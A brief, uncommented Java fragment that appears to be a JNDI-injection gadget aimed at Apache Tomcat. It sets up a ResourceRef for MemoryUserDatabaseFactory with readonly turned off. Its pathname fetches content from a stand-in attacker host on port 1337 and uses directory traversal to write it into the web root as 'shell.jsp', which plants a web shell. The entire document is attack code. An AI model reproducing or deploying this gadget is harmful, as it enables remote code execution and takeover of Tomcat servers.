ResourceRef fileRef = new ResourceRef(
    "org.apache.catalina.UserDatabase", null, "", "", true,
    "org.apache.catalina.users.MemoryUserDatabaseFactory", null);
fileRef.add(new StringRefAddr("readonly", "false"));
fileRef.add(new StringRefAddr("pathname",
    "http://attacker:1337/../../../../webapps/ROOT/shell.jsp"));
